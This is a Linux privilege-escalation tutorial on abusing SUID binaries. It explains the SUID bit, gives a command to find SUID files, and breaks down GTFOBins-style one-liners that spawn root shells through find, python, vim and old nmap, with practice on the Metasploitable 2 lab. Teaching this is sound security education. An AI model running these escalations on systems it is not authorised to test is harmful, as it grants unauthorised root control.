# 01 — SUID Abuse

## What is SUID?

Every file in Linux has **permissions** — who can read it, write it, or execute it.

SUID stands for **Set User ID**. It is a special permission bit on an executable file.

**Normal execution:**
When you run a program, it runs **as you** (your username, your privileges).

**SUID execution:**
When a program has the SUID bit set, it runs **as the owner of the file** — not as you.

Most SUID files are owned by `root`. So if a SUID binary owned by root has a vulnerability or can be abused, **it runs as root** — even if you are a low-privilege user.

---

## Visual Example

```
-rwsr-xr-x  1 root root  /usr/bin/passwd
     ^
     This 's' here = SUID bit is set
```

The `s` in place of `x` (execute bit) means SUID is active.

When a normal user runs `/usr/bin/passwd`, it temporarily runs as `root` — because only root can write to `/etc/shadow` where passwords are stored. This is the legitimate use of SUID.

The problem arises when **other binaries** (like text editors, scripting tools, file managers) have SUID set by mistake or misconfiguration.

---

## Step 1 — Find All SUID Binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Breaking down this command:**

| Part | Meaning |
|------|---------|
| `find` | The find command — searches files/directories |
| `/` | Start searching from root (entire filesystem) |
| `-perm -u=s` | Find files where the SUID bit (`u=s`) is set |
| `-type f` | Only files (not directories) |
| `2>/dev/null` | Discard error messages (permission denied errors) so output is clean |

**Example output:**
```
/usr/bin/passwd
/usr/bin/sudo
/bin/su
/usr/bin/find       ← Interesting!
/usr/bin/python     ← Very interesting!
/usr/bin/nmap       ← Very interesting!
/usr/bin/vim        ← Very interesting!
```

The first three are normal and expected. The last four are potentially exploitable.

---

## Step 2 — Check GTFOBins

**GTFOBins** (https://gtfobins.github.io) is a list of Unix binaries that can be exploited if they have SUID set.

For every interesting binary you find, search it on GTFOBins under the "SUID" category.

---

## Step 3 — Exploitation Examples

### Example A: `/usr/bin/find` with SUID

If `find` has SUID and is owned by root:

```bash
find . -exec /bin/sh -p \; -quit
```

**Breaking down this command:**

| Part | Meaning |
|------|---------|
| `find .` | Run find in current directory |
| `-exec` | Execute a command for each result |
| `/bin/sh` | Launch a shell |
| `-p` | Preserve privileges (don't drop root privileges) |
| `\;` | End of the `-exec` command |
| `-quit` | Stop after first result (we only need one shell) |

**Result:** A root shell.

---

### Example B: `/usr/bin/python` with SUID

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

**Breaking down this command:**

| Part | Meaning |
|------|---------|
| `python -c` | Run Python code directly from command line |
| `import os` | Import the OS module (lets us run system commands) |
| `os.execl(...)` | Replace current process with a new one |
| `"/bin/sh"` | Launch `/bin/sh` (the shell) |
| `"sh", "-p"` | Arguments: name it "sh", `-p` means preserve privileges |

**Result:** A root shell.

---

### Example C: `/usr/bin/vim` with SUID

```bash
vim -c ':!/bin/sh -p'
```

**Breaking down this command:**

| Part | Meaning |
|------|---------|
| `vim -c` | Run a vim command on startup |
| `':!/bin/sh -p'` | In vim, `!` means run a shell command. This runs `/bin/sh -p` |
| `-p` | Preserve privileges |

**Result:** A root shell inside vim.

---

### Example D: `/usr/bin/nmap` with SUID (older versions)

```bash
nmap --interactive
```

Inside nmap interactive mode:
```
nmap> !sh
```

**Explanation:** Old versions of nmap had an `--interactive` mode where you could run shell commands. If nmap has SUID, those shell commands run as root.

---

## Step 4 — Verify You Are Root

After exploitation, always confirm:

```bash
id
# Expected output: uid=0(root) gid=0(root) groups=0(root)

whoami
# Expected output: root
```

---

## Practice on Metasploitable 2

Metasploitable 2 has several SUID binaries by default.

```bash
# After getting a shell on Metasploitable 2:
find / -perm -u=s -type f 2>/dev/null

# Look for: nmap, python, find, vim
# Pick one and exploit using GTFOBins method above
```

---

## Summary

```
1. find / -perm -u=s -type f 2>/dev/null   → Find all SUID binaries
2. Compare list with GTFOBins              → Find which ones are exploitable
3. Run the exploit command                 → Get root shell
4. Verify with: id                         → Confirm root
```
